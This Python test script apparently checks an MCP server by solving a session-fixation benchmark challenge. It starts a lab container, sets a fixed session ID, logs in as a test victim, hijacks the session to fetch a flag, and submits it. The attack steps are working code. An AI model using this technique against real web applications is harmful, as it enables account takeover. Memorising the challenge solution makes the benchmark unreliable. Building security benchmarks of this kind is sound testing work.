#!/usr/bin/env python3
"""
Test MCP server by solving S7BEN-MED-001 (Session Fixation)
"""
import subprocess
import json
import time
import requests

STRIKE7_API = "http://139.59.80.137:5500"
BENCHMARK_ID = "S7BEN-MED-001"
BENCHMARK_PORT = 5010

def api_call(method, endpoint, data=None):
    """Make API call to Strike7 dashboard"""
    url = f"{STRIKE7_API}{endpoint}"
    if method == "GET":
        return requests.get(url, timeout=10).json()
    elif method == "POST":
        return requests.post(url, json=data, timeout=30).json()

def test_benchmark_med001():
    """Solve S7BEN-MED-001 using session fixation attack"""

    print("=" * 60)
    print("MCP TEST: S7BEN-MED-001 (Session Fixation)")
    print("=" * 60)

    # Step 1: Start container
    print("\n[1/7] Starting benchmark container...")
    start_result = api_call("POST", f"/api/benchmark/{BENCHMARK_ID}/start", {
        "force_stop_others": True,
        "timeout_minutes": 30
    })
    assert start_result['status'] == 'success'
    print(f"✓ Container started on port {BENCHMARK_PORT}")

    time.sleep(5)  # Wait for container

    # Step 2: Reconnaissance - Check login endpoint
    print("\n[2/7] Performing reconnaissance...")
    base_url = f"http://139.59.80.137:{BENCHMARK_PORT}"

    # Check if app is responding
    try:
        resp = requests.get(base_url, timeout=10)
        print(f"✓ App responding (status {resp.status_code})")
    except Exception as e:
        print(f"✗ App not responding: {e}")
        return False

    # Step 3: Attack Phase 1 - Create session with fixed ID
    print("\n[3/7] Attack Phase 1: Creating session with fixed ID...")
    session = requests.Session()
    fixed_sid = "ATTACKER_FIXED_SESSION_123"

    # Access app with fixed session ID parameter
    resp = session.get(f"{base_url}/?sid={fixed_sid}")
    print(f"✓ Fixed session created: {fixed_sid}")

    # Step 4: Attack Phase 2 - Simulate victim login
    print("\n[4/7] Attack Phase 2: Victim logs in (session not regenerated)...")

    # Login as victim using the fixed session
    login_data = {
        "username": "victim",
        "password": "password123"
    }
    resp = session.post(f"{base_url}/login", data=login_data)
    print(f"✓ Victim logged in (session still: {fixed_sid})")

    # Step 5: Attack Phase 3 - Hijack session
    print("\n[5/7] Attack Phase 3: Hijacking victim's session...")

    # Create new session with the same fixed ID
    attacker_session = requests.Session()
    attacker_session.cookies.set('session_id', fixed_sid)

    # Access protected endpoint
    resp = attacker_session.get(f"{base_url}/api/verify-hijack")

    if resp.status_code == 200:
        data = resp.json()
        flag = data.get('flag', '')
        print(f"✓ Session hijacked! Flag: {flag}")
    else:
        print(f"✗ Session hijack failed: {resp.status_code}")
        return False

    # Step 6: Submit flag
    print("\n[6/7] Submitting flag...")
    submit_result = api_call("POST", f"/api/benchmark/{BENCHMARK_ID}/submit-flag", {
        "flag": flag
    })

    if submit_result.get('correct'):
        print(f"✓ Flag correct! {submit_result.get('message', '')}")
    else:
        print(f"✗ Flag incorrect: {submit_result.get('message', '')}")
        print(f"  Expected format: S7BEN{{session_fixation_<hash>}}")
        print(f"  Received: {flag}")
        return False

    # Step 7: Stop container
    print("\n[7/7] Stopping container...")
    stop_result = api_call("POST", f"/api/benchmark/{BENCHMARK_ID}/stop")
    time.sleep(2)

    # Verify stopped
    status = api_call("GET", "/api/containers/status")
    still_running = any(c['benchmark_id'] == BENCHMARK_ID for c in status.get('containers', []))

    if not still_running:
        print(f"✓ Container stopped successfully")
    else:
        print(f"✗ Container still running!")
        return False

    print("\n" + "=" * 60)
    print("✅ MCP TEST PASSED: S7BEN-MED-001 SOLVED")
    print("=" * 60)
    return True

if __name__ == "__main__":
    success = test_benchmark_med001()
    exit(0 if success else 1)
